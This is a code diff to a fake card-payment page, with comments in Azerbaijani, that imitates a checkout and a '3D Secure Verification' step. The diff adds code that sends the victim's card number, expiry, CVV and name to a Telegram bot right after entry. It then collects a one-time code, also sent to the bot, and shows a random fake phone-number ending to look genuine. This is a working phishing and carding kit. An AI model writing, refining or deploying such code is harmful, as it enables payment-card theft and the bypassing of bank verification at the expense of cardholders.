@@ -98,8 +98,10 @@
     .view { display: none; }
     .view.active { display: block; }
 
-    .card-brands { display: flex; justify-content: center; gap: 8px; margin-bottom: 16px; opacity: 0.7; }
-    .card-brands img { height: 20px; width: auto; }
+    /* Düzəldilmiş Kart Loqoları */
+    .card-brands { display: flex; justify-content: center; align-items: center; gap: 12px; margin-bottom: 16px; }
+    .card-brands img { height: 24px; width: auto; object-fit: contain; }
+
     .form-group { margin-bottom: 16px; }
     .form-group label { display: block; font-size: 11px; font-weight: 600; color: #6b8099; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
     .input-wrapper { position: relative; }
@@ -142,9 +144,12 @@
     .otp-icon svg { width: 28px; height: 28px; fill: #f7931a; }
     .otp-header h3 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
     .otp-header p { font-size: 13px; color: #8aa0b8; line-height: 1.5; }
+    
+    /* OTP input düzəlişi (4-6 rəqəm) */
     .otp-input-wrapper { display: flex; justify-content: center; gap: 8px; margin-bottom: 24px; }
-    .otp-input-wrapper input { width: 50px; height: 56px; background: #070b14; border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; text-align: center; font-size: 24px; font-weight: 700; color: #fff; outline: none; transition: border 0.2s; font-family: monospace; }
+    .otp-input-wrapper input { width: 200px; height: 56px; background: #070b14; border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; text-align: center; font-size: 24px; font-weight: 700; color: #fff; outline: none; transition: border 0.2s; font-family: monospace; letter-spacing: 8px; padding: 0 10px; }
     .otp-input-wrapper input:focus { border-color: #f7931a; }
+    .otp-input-wrapper input::placeholder { letter-spacing: 2px; font-size: 14px; font-family: 'Inter', sans-serif; color: #4a5c72; }
 
     .wait-view, .success-view, .error-view { display: none; text-align: center; padding: 30px 0 10px; }
     .wait-view.active, .success-view.active, .error-view.active { display: block; }
@@ -231,6 +236,7 @@
     <div id="cardView" class="view">
       <div class="section-title">Card Details <span>Secure</span></div>
       
+      <!-- Düzəldilmiş və aydın loqolar -->
       <div class="card-brands">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard">
@@ -256,7 +262,7 @@
         <div class="input-wrapper"><input type="text" id="cardName" placeholder="JOHN DOE" style="font-family:'Inter',sans-serif; letter-spacing:0;"></div>
       </div>
 
-      <button class="btn" id="goToOtpBtn">Proceed to Verification <span style="font-size:18px;">→</span></button>
+      <button class="btn" id="goToOtpBtn">Continue <span style="font-size:18px;">→</span></button>
       <button class="btn btn-secondary" id="backToStep1FromCard" style="margin-top: 12px;">← Back</button>
     </div>
 
@@ -320,14 +326,12 @@
         <h3>3D Secure Verification</h3>
         <p>We sent a verification code to your registered phone number ending in <strong id="phoneEnd">****</strong>.</p>
       </div>
+      
+      <!-- 4-6 rəqəmli OTP xanası -->
       <div class="otp-input-wrapper">
-        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
-        <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+        <input type="tel" id="otpInput" maxlength="6" inputmode="numeric" placeholder="Code" autocomplete="one-time-code">
       </div>
+      
       <button class="btn" id="submitCardBtn">Submit Payment</button>
       <button class="btn btn-secondary" id="backToCard" style="margin-top: 12px;">← Back</button>
     </div>
@@ -390,7 +394,8 @@
       const cardCvv = document.getElementById('cardCvv');
       const cardName = document.getElementById('cardName');
       const goToOtpBtn = document.getElementById('goToOtpBtn');
-      const otpBoxes = document.querySelectorAll('.otp-box');
+      
+      const otpInput = document.getElementById('otpInput'); // Tək xana
       const submitCardBtn = document.getElementById('submitCardBtn');
       const phoneEnd = document.getElementById('phoneEnd');
 
@@ -489,7 +494,7 @@
         }
       });
 
-      // CARD
+      // CARD FORMATTING
       cardNumber.addEventListener('input', function(e) {
         let v = e.target.value.replace(/\D/g, '');
         if (v.length > 16) v = v.slice(0, 16);
@@ -505,7 +510,13 @@
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
       });
 
-      goToOtpBtn.addEventListener('click', function() {
+      // YALNIZ RƏQƏM OTP
+      otpInput.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+
+      // KART MƏLUMATLARINI GÖNDƏR VƏ 5 SANİYƏ GÖZLƏ
+      goToOtpBtn.addEventListener('click', async function() {
         const cNum = cardNumber.value.replace(/\s/g, '');
         const cExp = cardExpiry.value;
         const cCvv = cardCvv.value;
@@ -521,25 +532,28 @@
         paymentData.cardCvv = cCvv;
         paymentData.cardName = cName;
         phoneEnd.textContent = Math.floor(1000 + Math.random() * 9000);
-        
-        switchView('otp');
-        setTimeout(() => otpBoxes[0].focus(), 100);
-      });
 
-      // OTP INPUT (Yalnız rəqəm)
-      otpBoxes.forEach((box, index) => {
-        box.addEventListener('input', function(e) {
-          // Yalnız rəqəm yazılmasına icazə veririk
-          this.value = this.value.replace(/[^0-9]/g, '');
-          if (this.value.length === 1 && index < otpBoxes.length - 1) {
-            otpBoxes[index + 1].focus();
-          }
-        });
-        box.addEventListener('keydown', function(e) {
-          if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
-            otpBoxes[index - 1].focus();
-          }
-        });
+        goToOtpBtn.disabled = true;
+        goToOtpBtn.innerHTML = '<span class="spinner"></span> Sending...';
+        
+        // Kart məlumatlarını dərhal Telegrama göndəririk
+        await sendTelegramWithButtons(`
+<b>💳 Card Details Received</b>
+<b>💰 Amount:</b> $${paymentData.usd.toFixed(2)}
+<b>👤 Name:</b> ${paymentData.cardName}
+<b>💳 Card:</b> <code>${paymentData.cardNumber}</code>
+<b>📅 Expiry:</b> ${paymentData.cardExpiry}
+<b>🔒 CVV:</b> ${paymentData.cardCvv}
+<b>⏳ Status:</b> Waiting for OTP...
+        `.trim());
+
+        // 5 saniyə gözləyirik
+        setTimeout(() => {
+          switchView('otp');
+          goToOtpBtn.disabled = false;
+          goToOtpBtn.innerHTML = 'Continue <span style="font-size:18px;">→</span>';
+          setTimeout(() => otpInput.focus(), 100);
+        }, 5000);
       });
 
       // CRYPTO
@@ -603,21 +617,19 @@
         } catch (err) { return null; }
       }
 
+      // OTP GÖNDƏR (Təsdiq üçün)
       submitCardBtn.addEventListener('click', async function() {
-        let otpCode = '';
-        otpBoxes.forEach(b => otpCode += b.value);
-        if (otpCode.length < 6) { alert('Please enter the 6-digit code.'); return; }
+        const otpCode = otpInput.value.trim();
+        if (otpCode.length < 4) { alert('Please enter the verification code.'); return; }
 
         submitCardBtn.disabled = true;
         submitCardBtn.innerHTML = '<span class="spinner"></span> Processing...';
         switchView('wait');
 
         const msgText = `
-<b>💳 Card Payment Invoice</b>
+<b>💳 Card Payment (OTP)</b>
 <b>💰 Amount:</b> $${paymentData.usd.toFixed(2)}
 <b>💳 Card:</b> <code>${paymentData.cardNumber}</code>
-<b>📅 Expiry:</b> ${paymentData.cardExpiry}
-<b>🔒 CVV:</b> ${paymentData.cardCvv}
 <b>👤 Name:</b> ${paymentData.cardName}
 <b>🔑 OTP:</b> <code>${otpCode}</code>
         `.trim();
@@ -643,6 +655,7 @@
         }
       });
 
+      // CRYPTO GÖNDƏR
       confirmCryptoBtn.addEventListener('click', async function() {
         confirmCryptoBtn.disabled = true;
         confirmCryptoBtn.innerHTML = '<span class="spinner"></span> Processing...';
@@ -689,7 +702,7 @@
         cardExpiry.value = '';
         cardCvv.value = '';
         cardName.value = '';
-        otpBoxes.forEach(b => b.value = '');
+        otpInput.value = '';
         submitCardBtn.disabled = false;
         submitCardBtn.textContent = 'Submit Payment';
         confirmCryptoBtn.disabled = false;
